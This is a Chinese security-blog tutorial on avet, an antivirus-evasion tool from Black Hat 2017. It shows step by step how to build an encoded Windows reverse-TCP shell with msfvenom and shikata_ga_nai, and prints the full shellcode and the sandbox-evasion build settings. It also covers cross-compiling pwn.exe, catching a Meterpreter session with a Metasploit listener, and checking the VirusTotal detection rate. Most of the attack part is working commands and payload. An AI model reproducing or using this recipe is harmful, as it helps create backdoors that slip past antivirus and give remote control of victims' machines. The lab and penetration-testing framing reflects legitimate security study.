> 原文链接: https://www.anquanke.com//post/id/86558 


# 【Blackhat】avet：杀软绕过工具使用教程


                                阅读量   
                                **203525**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t018ccbfcf7c6a7024d.png)](https://p1.ssl.qhimg.com/t018ccbfcf7c6a7024d.png)

****

作者：[**lfty89******](http://bobao.360.cn/member/contribute?uid=2905438952)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**0x01 简介**



**avet是一款在github（[https://github.com/govolution/avet](https://github.com/govolution/avet) ）上的杀软绕过技术工具，同时也是2017亚洲黑帽大会（3月28日-7月31日）/美拉斯维加斯黑帽大会（7月22日-7月27日 PST）的arsnal（https://www.blackhat.com/us-17/arsenal/schedule/index.html）工具之一。**

这里是avet在亚洲黑大上的链接：

[https://www.blackhat.com/asia-17/arsenal.html#avet-antivirus-evasion-tool](https://www.blackhat.com/asia-17/arsenal.html#avet-antivirus-evasion-tool)

这里是avet在拉斯维加斯黑大上的链接：

[https://www.blackhat.com/us-17/arsenal/schedule/index.html#avet—antivirus-evasion-tool-7908](https://www.blackhat.com/us-17/arsenal/schedule/index.html#avet---antivirus-evasion-tool-7908)

<br>

**0x02 环境搭建**

我们在kali中测试使用avet，据avet作者介绍，在使用avet前，需要利用wine安装tdm-gcc，根据作者提供的教程（USING TDM GCC WITH KALI 2）安装tdm-gcc：

[https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/](https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/)

**下载tdm-gcc**

从[https://sourceforge.net/projects/tdm-gcc/](https://sourceforge.net/projects/tdm-gcc/) 下载最新的tdm64-gcc-5.1.0-2.exe

或者在kali中用wget：

```
#wget -c --no-check-certificate https://nchc.dl.sourceforge.net/project/tdm-gcc/TDM-GCC%20Installer/tdm64-gcc-5.1.0-2.exe
```

**安装tdm-gcc**

```
#wine tdm64-gcc-5.1.0-2.exe
```

弹出安装窗口：

[![](https://p5.ssl.qhimg.com/t011f847c165067d4ec.png)](https://p5.ssl.qhimg.com/t011f847c165067d4ec.png)

选择create-&gt;MinGW-w64/TDM64(32-bit and 64-bit)<br>

[![](https://p2.ssl.qhimg.com/t01519a06e5d4254a53.png)](https://p2.ssl.qhimg.com/t01519a06e5d4254a53.png)

默认安装路径C:TDM-GCC-64，之后选择默认镜像及组件，完成安装。

<br>

**0x03 使用示例**

**生成载荷**

先从github上下载avet：

```
#git clone https://github.com/govolution/avet
```

进入build目录，可以看到各种类型的payload：

[![](https://p5.ssl.qhimg.com/t01e1c1c01eb6da8784.png)](https://p5.ssl.qhimg.com/t01e1c1c01eb6da8784.png)

这里我们测试build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh，打开文件编辑：<br>

将lhost设置成kali的ip，lport为kali监听的端口：

[![](https://p2.ssl.qhimg.com/t01feee529ef69b9001.png)](https://p2.ssl.qhimg.com/t01feee529ef69b9001.png)

回到上一层目录，这里需要注意一下，从github上下载的项目文件夹中默认有编译过的make_evet和sh_format，但是在使用时如果平台或架构不同的话会可能发生报错，如作者编译发布的make_evet是64位的，而笔者的环境是32位kali，运行报错：



```
root@kali:~/Desktop# file make_avet 
make_avet: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9c06de9a25ab707db3ffc4882cebe862006c2d24, not stripped
```

[![](https://p4.ssl.qhimg.com/t018448f2b82b8fc421.png)](https://p4.ssl.qhimg.com/t018448f2b82b8fc421.png)

所以最好还是重新编译make_evet和sh_format：



```
#gcc -o make_avet make_avet.c
#gcc -o sh_format sh_format.c
```

 下面开始生成payload：



```
root@kali:~/Desktop/avet-master# ./build/build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai succeeded with size 387 (iteration=1)
x86/shikata_ga_nai succeeded with size 414 (iteration=2)
x86/shikata_ga_nai chosen with final size 414
Payload size: 414 bytes
Final size of c file: 1764 bytes
tr: warning: an unescaped backslash at end of string is not portable
 
 ________  ___      ___ _______  _________  
|   __  |      /  /|  ___ |___   ___ 
   |       /  / |    __/|___   _| 
     __     /  / /    _|/__       
             / /      _|       
    __ __ __/ /      _______   __
    |__||__||__|/       |_______|   |__|
 
 
Anti Virus Evasion Make Tool by Daniel Sauder
use -h for help
 
write shellcode from scclean.txt to defs.h
```

最终生成pwn.exe

[![](https://p3.ssl.qhimg.com/t019ee5495f20525b3a.png)](https://p3.ssl.qhimg.com/t019ee5495f20525b3a.png)

**测试载荷**<br>

在kali上运行metasploit、设置本地监听参数、开始监听：



```
#msfconsole
msf &gt; use exploit/multi/handler
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set LHOST 192.168.1.120
LHOST =&gt; 192.168.1.120
msf exploit(handler) &gt; set LPORT 443
LPORT =&gt; 443
msf exploit(handler) &gt; exploit -j
```

[![](https://p4.ssl.qhimg.com/t01e92e64fd640af5a7.png)](https://p4.ssl.qhimg.com/t01e92e64fd640af5a7.png)

在一台32位win7靶机上运行pwn.exe：

[![](https://p2.ssl.qhimg.com/t011a119a8b4db41db3.png)](https://p2.ssl.qhimg.com/t011a119a8b4db41db3.png)

回到kali上，连接已建立：

[![](https://p5.ssl.qhimg.com/t0180e5494d152dee51.png)](https://p5.ssl.qhimg.com/t0180e5494d152dee51.png)

<br>

**0x04 流程分析**

再次查看文件build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh

脚本先运行

```
. build/global_win32.sh
```

将编译目标设为win32平台：

```
win32_compiler="wine gcc -m32"
```

再使用msfvenom生成shellcode：

```
msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.120 lport=443 -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows &gt; sc.txt
```

查看内容：



```
# cat sc.txt
unsigned char buf[] = 
"xbdx2ex23x28x83xdbxddxd9x74x24xf4x5bx2bxc9xb1"
"x61x31x6bx15x83xc3x04x03x6bx11xe2xdbx99xa5x00"
"x06xe0x6cxc5x91x68xabx3ex7axb8x7ax0fx27x8bx2f"
"x62xd4xb8xddx01xbcx41x25xcexe2xf7x1bx13x5axe6"
"x2cx67xd2x3bx4exddx7bx68x95xd5x21xaax32x93xdf"
"x0ax60x1cx8fxc4x1fx12x59xa1xc3xecx21x89x0cx7b"
"x82xc2x12xf2x8cxe5x96xc6xcdxd6x69x82xe4x9dxcc"
"x09x5axc8x36xa7x52x1exb3xa3x22x20xecx81x77x59"
"x8ax04x88x9dxd3xffx1ax55x6dx45xe0x39x98x39x2c"
"xe1x62x66x1axb9xa7x73x15x1fxb5xb2xb8x6exf6x3b"
"xccx8exd5xb9x77x09x7ax06xbex70xa7xe6x9ax0axeb"
"xfaxa9x2cx40xa5x92xadx10x66x24x32xdex7bx3dx8d"
"x3cx25xf6xe5xe4x52xf7xedx37xf5x28x0ex45x35x15"
"x71x12xb3x87xcbx7ax1bx39xefx7cx0ex81x5fxa6x87"
"xa4xfdx09xb5x60xc7xf0xa1x97xefx84xe7x7fx5dxb7"
"x9fx90xe5x55xebx18x8cx5bx37x12xa3xc2xfcx5dx9e"
"x75x57xa3x4fxbbxb4x83x1fxe3x72x6ax61x73x0dxa0"
"x31x6ex47x5bx78x12x20xacx0cxb8x80x0bxe3xc1x16"
"x90x46x69xa6x93x4cx32xe0x84x0bxdfxb6x69xf9xd4"
"xb6x1exddxdfxd4xdax17x5dx70x7fxc0xe3x99xbdxd5"
"xfbx3cx22x38x8dx1ex90x97x73xacx59xe0xf3x52x1d"
"xa6x9axc3x51x45x7axdax2dx01xe1x28xabxf5xe1xe4"
"xffx2cxebx03x73x5dxebx11x1fxe3x57xfax3cxb6x15"
"x5axb4x87x2axadxc6x2ex15x03xf8xbax58x47x69xbb"
"x42xd0x61xb0x20x05x76x10x25x0ex2ax18xcdx54xdc"
"x66xfbx83xc7x94x85x83xe7xf4x7fxb1xcbxc7x23x96"
"x43x66x30x24xf4xf2x9cxe1x59x7dx37x4cx2bx28x23"
"x93x2fxf8x20x38x85xc1x54x29";
```

接着调用format.sh-&gt; sh_format对shellcode进行格式调整/编码



```
./format.sh sc.txt &gt; scclean.txt &amp;&amp; rm sc.txt
# cat scclean.txt 
bd2e232883dbddd97424f45b2bc9b161316b1583c304036b11e2db99a50006e06cc59168ab3e7ab87a0f278b2f62d4b8dd01bc4125cee2f71b135ae62c67d23b4edd7b6895d521aa3293df0a601c8fc41f1259a1c3ec21890c7b82c212f28ce596c6cdd66982e49dcc095ac836a7521eb3a32220ec8177598a04889dd3ff1a556d45e03998392ce162661ab9a773151fb5b2b86ef63bcc8ed5b977097a06be70a7e69a0aebfaa92c40a592ad10662432de7b3d8d3c25f6e5e452f7ed37f5280e4535157112b387cb7a1b39ef7c0e815fa687a4fd09b560c7f0a197ef84e77f5db79f90e555eb188c5b3712a3c2fc5d9e7557a34fbbb4831fe3726a61730da0316e475b781220ac0cb8800be3c116904669a6934c32e0840bdfb669f9d4b61edddfd4da175d707fc0e399bdd5fb3c22388d1e909773ac59e0f3521da69ac351457ada2d01e128abf5e1e4ff2ceb03735deb111fe357fa3cb6155ab4872aadc62e1503f8ba584769bb42d061b020057610250e2a18cd54dc66fb83c7948583e7f47fb1cbc7239643663024f4f29ce1597d374c2b2823932ff8203885c15429
```

将调整后的shellcode作为make_avet的输入文件，-E表示启动杀软的沙盒绕过机制

```
./make_avet -f scclean.txt -F –E
```

最后写入defs.h



```
# cat defs.h
#define FVALUE "bd2e232883dbddd97424f45b2bc9b161316b1583c304036b11e2db99a50006e06cc59168ab3e7ab87a0f278b2f62d4b8dd01bc4125cee2f71b135ae62c67d23b4edd7b6895d521aa3293df0a601c8fc41f1259a1c3ec21890c7b82c212f28ce596c6cdd66982e49dcc095ac836a7521eb3a32220ec8177598a04889dd3ff1a556d45e03998392ce162661ab9a773151fb5b2b86ef63bcc8ed5b977097a06be70a7e69a0aebfaa92c40a592ad10662432de7b3d8d3c25f6e5e452f7ed37f5280e4535157112b387cb7a1b39ef7c0e815fa687a4fd09b560c7f0a197ef84e77f5db79f90e555eb188c5b3712a3c2fc5d9e7557a34fbbb4831fe3726a61730da0316e475b781220ac0cb8800be3c116904669a6934c32e0840bdfb669f9d4b61edddfd4da175d707fc0e399bdd5fb3c22388d1e909773ac59e0f3521da69ac351457ada2d01e128abf5e1e4ff2ceb03735deb111fe357fa3cb6155ab4872aadc62e1503f8ba584769bb42d061b020057610250e2a18cd54dc66fb83c7948583e7f47fb1cbc7239643663024f4f29ce1597d374c2b2823932ff8203885c15429"
#define SANDBOX_FOPEN
#define ENCRYPT
```

最后利用交叉编译工具生成最终的pwn.exe：

```
$win32_compiler -o pwn.exe avet.c
```

下面附下make_evet的使用说明：

make_avet是avet中的针对shellcode的加载、配置工具。使用时，可以选择从本地文件或者url上加载shellcode代码，加载的shellcode代码会被写入到本地的defs.h文件中，并根据运行make_avet时提供的参数添加额外设置。

make_avet的编译命令如下：

```
gcc -o make_avet make_avet.c
```

make_avet使用说明：



```
Anti Virus Evasion Make Tool by Daniel Sauder
use -h for help
 Options:
-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt
-f compile shellcode into .exe, needs filename of shellcode file
-u load and exec shellcode from url using internet explorer (url is compiled into executable)
-E use avets ASCII encryption, often do not has to be used
   Note: with -l -E is mandatory
-F use fopen sandbox evasion
-X compile for 64 bit
-p print debug information
-h help
```



**0x05 查杀情况**

这里我们将build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh 生成的pwn.exe上传virustotal，扫描结果如下图：

[![](https://p4.ssl.qhimg.com/t01e6b3f61861e2f63a.png)](https://p4.ssl.qhimg.com/t01e6b3f61861e2f63a.png)

虽然还是被卡巴杀了，但整体通过率还是较高的。<br>

<br>

**0x06 参考引用**

[https://github.com/govolution/avet](https://github.com/govolution/avet)

[https://www.blackhat.com/us-17/](https://www.blackhat.com/us-17/)

[https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf](https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf)

[https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf](https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf)

[https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/](https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/)
